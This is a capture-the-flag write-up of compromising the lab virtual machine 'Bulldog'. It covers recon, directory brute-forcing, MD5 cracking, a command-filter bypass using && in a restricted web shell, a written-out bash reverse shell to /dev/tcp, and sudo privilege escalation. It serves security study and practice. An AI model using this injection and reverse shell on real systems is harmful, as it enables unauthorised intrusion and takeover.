

### **Netdiscover**

![netdiscover](images/bulldog/netdiscover.png)

We use the tools called netdiscover scan hosts, we found the 192.168.0.107 is our target virtualbox host ip.

------

### **Namp**

![nmap](images/bulldog/nmap.png)

We found some services  <u>HTTP</u>, <u>SSH</u>

------

### Solution

通过python dirsearch.py  -u url   -e py

![disearch](images/bulldog/disearch.png)

We found  /admin, /dev /robots.txt.

![admin-login](images/bulldog/admin-login.png)

![robots](images/bulldog/robots.png)

![dev](images/bulldog/dev.png)

The web shell needs to login to use,  so we login in admin page, but we have no users and passwords.

we can find in this dev page, exists some email, we inspect source code.

![hash](images/bulldog/hash.png)

By crack md5 password,  We can find two pair: **nick == > bulldog, sarah ==> bulldoglover**

Now let we login in nick, of cource sarah same.

![nick](images/bulldog/nick.png)

Nothing found in page. so we turn to /dev webshell.

![nc](images/bulldog/nc.png)

Found only six command can use, So we generate  shell at first, but can't make effect.

We guessed that wether we could append root user to /etc/passwd. 

![append](images/bulldog/append.png)

But Error.

So let's try to bypass, we use &&

![whoami](images/bulldog/whoami.png)

Then we execute our shell file.But nc's error occur, may this user not installed, So We use basic bash to reverse shell.

`echo '1' && echo 'bash -i >& /dev/tcp/192.168.0.106/2333 0>&1' > reverse.sh`

`echo '1' && chmod +x reverse.sh`

`echo '1' && bash reverse.sh` 

![reverse](images/bulldog/reverse.png)

reverse shell successfully!!!

So we find /home directory and some interesting found.

![ls](images/bulldog/ls.png)

according to this note, may the django login from this App, we may find somethings from it.

![app](images/bulldog/app.png)

After some retries, we found this password :**SUPERultimatePASSWORDyouCANTget**

ssh login with django, it's ok.

![ssh](images/bulldog/ssh.png)

We find wether the django user has sudo prilivege.

![sudo](images/bulldog/sudo.png)

So we can su root to get root privilege.

![flag](images/bulldog/flag.png)

------

**That' all , Thanks for your watching**